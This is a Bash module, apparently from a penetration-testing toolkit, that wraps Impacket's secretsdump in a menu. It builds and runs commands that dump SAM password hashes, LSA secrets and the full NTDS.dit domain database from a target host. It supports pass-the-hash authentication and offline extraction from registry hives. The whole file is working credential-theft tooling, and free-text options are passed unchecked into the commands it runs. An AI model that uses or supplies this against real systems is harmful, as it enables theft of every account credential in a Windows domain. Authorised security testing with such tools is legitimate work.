#!/bin/bash
#
# Impacket Credentials Module
# Contains credential dumping tools: SecretsDump
#
# This module provides functions for dumping credentials from Windows systems
# using Impacket's secretsdump tool. Capabilities include:
#   - SAM database dumping (local user hashes)
#   - LSA secrets extraction
#   - NTDS.dit dumping (Active Directory database)
#   - Offline credential extraction from registry hives
#

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

# Note: This module expects the following global variables to be set:
# - DOMAIN: Domain name
# - USERNAME: Username for authentication
# - PASSWORD: Password for authentication
# - HASH: NTLM hash for pass-the-hash
# - TARGET: Target IP or hostname
#
# And these functions to be available:
# - get_target_for_command(): Gets target(s) based on run mode
# - show_menu(): Displays menu using fzf
# - run_command(): Executes command with preview and confirmation

# Handle SecretsDump operations
handle_secretsdump() {
    target=$(get_target_for_command) || return
    subchoice=$(show_menu "impacket_secretsdump" "Select Dump Method: ")

    if [[ -n "$HASH" ]]; then
        impacket_auth="$DOMAIN/$USERNAME@$target -hashes :$HASH"
    else
        impacket_auth="$DOMAIN/$USERNAME:'$PASSWORD'@$target"
    fi

    case "$subchoice" in
        "Dump All (SAM+LSA+NTDS)")
            echo -e "${CYAN}This will dump SAM, LSA secrets, and NTDS if DC${NC}"
            run_command "impacket-secretsdump $impacket_auth"
            ;;
        "Dump SAM Only")
            run_command "impacket-secretsdump $impacket_auth -sam"
            ;;
        "Dump LSA Secrets Only")
            run_command "impacket-secretsdump $impacket_auth -security"
            ;;
        "Dump NTDS (Domain Controller)")
            echo -e "${CYAN}Dumping NTDS.dit from Domain Controller${NC}"
            echo -e "${YELLOW}This may take a while on large domains...${NC}"
            run_command "impacket-secretsdump $impacket_auth -just-dc"
            ;;
        "Dump with Specific Hashes")
            echo -e "${CYAN}Options: -just-dc-ntlm (NTLM only), -just-dc-user <user>${NC}"
            read -p "Additional options: " opts
            run_command "impacket-secretsdump $impacket_auth $opts"
            ;;
        "Dump from Offline Files")
            read -p "SAM file path: " sam
            read -p "SYSTEM file path: " system
            read -p "SECURITY file path (optional): " security
            cmd="impacket-secretsdump -sam '$sam' -system '$system'"
            [[ -n "$security" ]] && cmd="$cmd -security '$security'"
            cmd="$cmd LOCAL"
            run_command "$cmd"
            ;;
    esac
}
